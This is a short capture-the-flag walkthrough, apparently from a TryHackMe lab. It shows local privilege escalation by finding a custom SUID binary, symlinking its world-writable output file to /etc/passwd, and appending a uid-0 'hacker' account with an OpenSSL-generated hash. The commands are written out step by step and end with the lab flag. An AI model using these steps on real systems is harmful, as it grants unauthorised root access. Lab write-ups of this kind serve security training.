Privilege Escalation — SUID Binary Abuse
Enumerating SUID binaries revealed a non-standard binary:
bashfind / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/patch_note
The patch_note binary runs as root and appends user-supplied input to /var/www/patch_history. Since /var/www/patch_history was world-writable and the directory was writable by www-data, the file could be replaced with a symlink to /etc/passwd.
Steps:
1. Upgrade to interactive shell:
bashpython3 -c 'import pty;pty.spawn("/bin/bash")'
2. Generate password hash:
bashopenssl passwd -1 hacked123
# $1$UDbsHWzy$uD0wH2HAgSXMEMTdCbwtU.
3. Symlink patch_history to /etc/passwd:
bashrm -f /var/www/patch_history
ln -sf /etc/passwd /var/www/patch_history
4. Run SUID binary and append new root user:
bash/usr/local/bin/patch_note
# Enter a line to append:
hacker:$1$UDbsHWzy$uD0wH2HAgSXMEMTdCbwtU.:0:0:root:/root:/bin/bash
5. Switch to new root user:
bashsu hacker
# password: hacked123
cat /root/root.txt
# THM{57e78446-a7de-48c4-aa9b-678bdd5b259e}

